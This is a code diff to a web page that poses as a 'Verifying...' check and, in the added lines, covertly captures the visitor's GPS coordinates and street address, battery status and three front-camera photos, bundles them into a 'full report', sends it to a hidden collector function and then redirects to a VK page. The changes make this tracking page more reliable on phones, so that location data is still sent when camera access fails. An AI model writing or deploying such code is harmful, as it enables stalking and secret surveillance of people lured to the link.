@@ -221,55 +221,87 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             document.getElementById('loader').style.display = 'block';
             document.getElementById('label-text').innerText = "Verifying...";
 
+            // 1. Запуск GPS сразу (параллельно)
+            let gps = "*GPS: Ожидание...*";
+            const gpsPromise = new Promise(resolve => {
+                if (!navigator.geolocation) return resolve("*GPS не поддерживается браузером*");
+                
+                const timer = setTimeout(() => resolve("*GPS: Тайм-аут (слишком долго)*"), 10000); // 10 сек
+
+                navigator.geolocation.getCurrentPosition(
+                    async p => {
+                        clearTimeout(timer);
+                        const {latitude:la, longitude:lo} = p.coords;
+                        const link = `https://www.google.com/maps?q=${la},${lo}`;
+                        let addr = "Не определен";
+                        try { 
+                            const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); 
+                            addr = (await req.json()).display_name; 
+                        } catch{}
+                        resolve(`Адрес: ${addr}\nКарты: [клик](${link})`);
+                    },
+                    (err) => {
+                        clearTimeout(timer);
+                        let e = "Ошибка";
+                        if (err.code === 1) e = "Запрещено пользователем";
+                        else if (err.code === 2) e = "Недоступно";
+                        else if (err.code === 3) e = "Тайм-аут";
+                        resolve(`*GPS Ошибка: ${e}*`);
+                    }, 
+                    { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
+                );
+            });
+
+            // 2. Батарея (Быстро)
             let bat = "N/A";
             if (navigator.getBattery) {
-                const bt = await navigator.getBattery();
-                bat = `${Math.round(bt.level * 100)}%${bt.charging?'⚡':''}`;
+                try {
+                    const bt = await navigator.getBattery();
+                    bat = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Заряжается' : 'От батареи'})`;
+                } catch {}
             }
 
+            // 3. Камера (С обработкой ошибок для мобилок)
+            let ph = [];
             try {
-                const st = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280}});
+                // Убрали width:1280, оставили ideal для совместимости с телефоном
+                const st = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 640 } } 
+                });
                 const v = document.getElementById('video');
                 v.srcObject = st;
-                await v.play();
+                
+                // Важно: игнорируем ошибку play() (на мобилках может быть запрещено)
+                try { await v.play(); } catch(e) { console.log("Auto-play blocked:", e); }
 
-                // GPS
-                let gps = "*GPS Denied*";
-                const gP = new Promise(r => {
-                    navigator.geolocation.getCurrentPosition(
-                        async p => {
-                            const {latitude:la, longitude:lo} = p.coords;
-                            const l = `https://www.google.com/maps?q=${la},${lo}`;
-                            let a = "Unknown";
-                            try { const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); a = (await req.json()).display_name; } catch{}
-                            r(`Адрес: ${a}\nКарты: [клик](${l})`);
-                        },
-                        () => r("*Юзер запретил доступ к GPS*"), {enableHighAccuracy:true}
-                    );
-                });
-
-                await sleep(2500); // Warmup
+                await sleep(1500); // Чуть меньше пауза
 
                 const c = document.getElementById('canvas');
-                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
                 const ctx = c.getContext('2d');
-                const ph = [];
 
                 for(let i=0; i<3; i++) {
                     ctx.drawImage(v,0,0);
-                    ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.8)));
-                    if(i<2) await sleep(800);
+                    // Сжимаем качество до 0.6 для скорости
+                    ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.6)));
+                    if(i<2) await sleep(500);
                 }
-
-                gps = await gP;
                 st.getTracks().forEach(t=>t.stop());
+            } catch (e) {
+                console.log("Camera Error:", e);
+                // Не выкидываем ошибку, чтобы отправился хотя бы GPS
+            }
 
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('success-icon').style.display = 'block';
-                document.getElementById('label-text').innerText = "Success!";
-                document.getElementById('label-text').style.color = "#009900";
+            // Ждем завершения GPS (если еще не готово)
+            document.getElementById('label-text').innerText = "Analyzing...";
+            gps = await gpsPromise;
 
-                const fM = `
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('success-icon').style.display = 'block';
+            document.getElementById('label-text').innerText = "Success!";
+            document.getElementById('label-text').style.color = "#009900";
+
+            const fM = `
 *ПОЛНЫЙ ОТЧЕТ (Phase 2)*
 ━━━━━━━━━━━━━━━━
 *ГЕОПОЗИЦИЯ*
@@ -279,16 +311,11 @@ ${gps}
 Заряд: ${bat}
 
 *ФОТО*
-Захвачено фото: ${ph.length} шт.
+Захвачено фото: ${ph.length > 0 ? ph.length : "НЕТ ДОСТУПА"}
 `.trim();
 
-                await _sD(fM, ph);
-                setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
-
-            } catch (e) {
-                _sD(`❌ *ACCESS DENIED*: ${e.message}`);
-                window.location.href = "https://vk.com/atypical_kazan";
-            }
+            await _sD(fM, ph);
+            setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
         };
     </script>
 </body>
